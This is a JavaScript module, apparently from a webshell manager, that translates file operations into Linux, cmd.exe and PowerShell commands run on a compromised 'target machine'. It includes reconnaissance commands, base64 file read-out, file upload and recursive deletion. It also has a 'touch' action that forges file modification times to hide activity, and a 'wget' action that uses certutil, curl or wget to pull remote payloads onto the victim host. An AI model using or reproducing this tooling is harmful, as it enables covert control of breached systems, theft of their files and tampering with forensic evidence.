// dsh-webshell-mgr 命令翻译层：把统一文件操作翻译成目标机 OS 命令（linux/windows），
// 含 POSIX / cmd.exe / PowerShell 三套引号转义与 ls -la / dir 输出解析。
// 供 system 类通道（cmd-system、加密通道的 c 操作码）使用；结构化优先级低于 eval 通道。

//#region 引号转义

/** POSIX sh 单引号包裹：'…'\''…' */
export function quotePosix(s) {
	return "'" + String(s).replace(/'/g, "'\\''") + "'";
}

/** cmd.exe 双引号包裹（内部 " 加倍）。 */
export function quoteCmd(s) {
	return '"' + String(s).replace(/"/g, '""') + '"';
}

/** PowerShell 单引号包裹（内部 ' 加倍，供 powershell -c 内嵌使用）。 */
export function quotePs(s) {
	return "'" + String(s).replace(/'/g, "''") + "'";
}

//#endregion

//#region OS 探测与基本信息

/** OS 探测命令：cmd.exe 展开 %OS% → Windows_NT；POSIX shell 原样回显字面量。 */
export const OS_PROBE_COMMAND = "echo :WSMPROBE-%OS%-END:";

/** 从 OS 探测输出判定系统。 */
export function parseOsProbe(output) {
	const text = String(output ?? "");
	if (text.includes("Windows_NT")) return "windows";
	if (text.includes(":WSMPROBE-%OS%-END:") || text.includes("WSMPROBE-%OS%-END")) return "linux";
	return null;
}

/** 基本信息命令组合（输出按行解析）。 */
export function basicInfoCommand(os) {
	return os === "windows"
		? "whoami & cd & ver"
		: "whoami; pwd; uname -a";
}

/** 解析基本信息输出 → {user, cwd, extra}。 */
export function parseBasicInfo(output, os) {
	const text = String(output ?? "").trim();
	const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
	const info = { user: lines[0] ?? "", cwd: lines[1] ?? "", extra: lines.slice(2).join(" | ") };
	return info;
}

//#endregion

//#region 文件操作 → 命令

/**
 * 统一文件操作 → 目标机命令。
 * @param {string} action ls|read|write-first|write-append|delete|delete-dir|mkdir|mv|chmod|chmod-attr|touch|stat|wget|hash
 */
export function buildFileCommand(action, a, os) {
	const isWin = os === "windows";
	switch (action) {
		case "ls":
			return isWin ? `dir /a ${quoteCmd(a.path)}` : `ls -la ${quotePosix(a.path)}`;
		case "read": // 二进制安全读：回显 base64（stdin 重定向——BSD/GNU base64 通用）
			return isWin
				? `certutil -encode ${quoteCmd(a.path)} %TEMP%\\wsm_b64.tmp && type %TEMP%\\wsm_b64.tmp & del %TEMP%\\wsm_b64.tmp`
				: `base64 < ${quotePosix(a.path)} | tr -d '\\n'`;
		case "write-first":
			return isWin
				? `powershell -NoProfile -c [IO.File]::WriteAllBytes(${quotePs(a.path)},[Convert]::FromBase64String(${quotePs(a.b64)}))`
				: `echo ${quotePosix(a.b64)} | base64 -d > ${quotePosix(a.path)}`;
		case "write-append":
			return isWin
				? `powershell -NoProfile -c $b=[Convert]::FromBase64String(${quotePs(a.b64)});$f=[IO.File]::Open(${quotePs(a.path)},[IO.FileMode]::Append);$f.Write($b,0,$b.Length);$f.Close()`
				: `echo ${quotePosix(a.b64)} | base64 -d >> ${quotePosix(a.path)}`;
		case "delete":
			return isWin ? `del /q /f ${quoteCmd(a.path)}` : `rm -f ${quotePosix(a.path)}`;
		case "delete-dir":
			return isWin ? `rd /s /q ${quoteCmd(a.path)}` : `rm -rf ${quotePosix(a.path)}`;
		case "mkdir":
			return isWin ? `md ${quoteCmd(a.path)}` : `mkdir -p ${quotePosix(a.path)}`;
		case "mv":
			return isWin ? `move /y ${quoteCmd(a.from)} ${quoteCmd(a.to)}` : `mv -f ${quotePosix(a.from)} ${quotePosix(a.to)}`;
		case "copy":
			return isWin ? `copy /y ${quoteCmd(a.from)} ${quoteCmd(a.to)}` : `cp -f ${quotePosix(a.from)} ${quotePosix(a.to)}`;
		case "chmod": // linux 数字权限
			return `chmod ${String(a.mode).replace(/[^0-7]/g, "") || "644"} ${quotePosix(a.path)}`;
		case "chmod-attr": // windows 只读/隐藏属性
			return `attrib ${a.readonly ? "+r" : "-r"}${a.hidden ? " +h" : " -h"} ${quoteCmd(a.path)}`;
		case "touch": // 伪造 mtime（epoch 秒）
			return isWin
				? `powershell -NoProfile -c (Get-Item -LiteralPath ${quotePs(a.path)}).LastWriteTime=([DateTime]::new(1970,1,1,0,0,0,[DateTimeKind]::Utc).AddSeconds(${Number(a.epoch) || 0}))`
				: `touch -d @${Math.trunc(Number(a.epoch) || 0)} ${quotePosix(a.path)}`;
		case "stat": // 读时间戳（epoch：modify|access|change）
			return `stat -c '%Y|%X|%Z' ${quotePosix(a.path)}`;
		case "stat-win":
			return `powershell -NoProfile -c (Get-Item -LiteralPath ${quotePs(a.path)}).LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')`;
		case "wget": // 远程 URL 下载到目标机
			return isWin
				? `certutil -urlcache -split -o ${quoteCmd(a.path)} ${quoteCmd(a.url)}`
				: `{ curl -fsSL -o ${quotePosix(a.path)} ${quotePosix(a.url)} || wget -q -O ${quotePosix(a.path)} ${quotePosix(a.url)}; }`;
		case "hash": // md5 校验（上传完整性核对）
			return isWin
				? `certutil -hashfile ${quoteCmd(a.path)} MD5`
				: `md5sum ${quotePosix(a.path)}`;
		default:
			throw new Error(`未知文件操作 ${action}`);
	}
}

//#endregion

//#region 输出解析

/** 解析 `ls -la` 输出 → [{name,isDir,size,perm,owner,mtime}]。 */
export function parseLs(text) {
	const out = [];
	for (const raw of String(text ?? "").split(/\r?\n/)) {
		const line = raw.replace(/\s+$/, "");
		if (!line || /^total\s+\d+/i.test(line)) continue;
		const m = /^([-bcdlps][rwxsStT+-]{9,})\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}(?::\d{2})?|\w{3}\s+\d{1,2}\s+\d{2}:\d{2}|\w{3}\s+\d{1,2}\s+\d{4})\s+(.+)$/.exec(line);
		if (!m) continue;
		out.push({
			name: m[7].trim(),
			isDir: m[1][0] === "d",
			size: Number(m[5]) || 0,
			perm: m[1],
			owner: `${m[3]}/${m[4]}`,
			mtime: m[6]
		});
	}
	return out;
}

/** 解析 `dir /a` 输出 → [{name,isDir,size,mtime}]。 */
export function parseDir(text) {
	const out = [];
	for (const raw of String(text ?? "").split(/\r?\n/)) {
		const line = raw.trim();
		if (!line) continue;
		if (/^(Volume in|Directory of|File\(s\)|Dir\(s\)|Total Files)/i.test(line)) continue;
		const m = /^(\d{1,2}[/.]\d{1,2}[/.]\d{2,4})\s+(\d{1,2}:\d{2}\s*[AP]M)\s+(<DIR>|<JUNCTION>|<SYMLINKD>)\s+(.+)$/.exec(line)
			?? /^(\d{1,2}[/.]\d{1,2}[/.]\d{2,4})\s+(\d{1,2}:\d{2}\s*[AP]M)\s+(\d[\d,]*)\s+(.+)$/.exec(line);
		if (!m) continue;
		const name = m[4].trim();
		if (name === "." || name === "..") continue;
		out.push({
			name,
			isDir: Boolean(m[3]?.startsWith("<")),
			size: m[3]?.startsWith("<") ? 0 : Number(String(m[3]).replace(/,/g, "")) || 0,
			perm: "",
			owner: "",
			mtime: `${m[1]} ${m[2]}`
		});
	}
	return out;
}

/** base64 读通道输出清洗：剥 certutil 头尾/换行。 */
export function cleanB64Output(text) {
	return String(text ?? "")
		.split(/\r?\n/)
		.filter((l) => !/CERTIFICATE/i.test(l) && !/CertUtil/i.test(l) && l.trim() !== "")
		.join("")
		.replace(/[^A-Za-z0-9+/=]/g, "");
}

/** 从命令输出提取回显 token（探测用）。 */
export function tokenEchoed(text, token) {
	return String(text ?? "").includes(token);
}

//#endregion
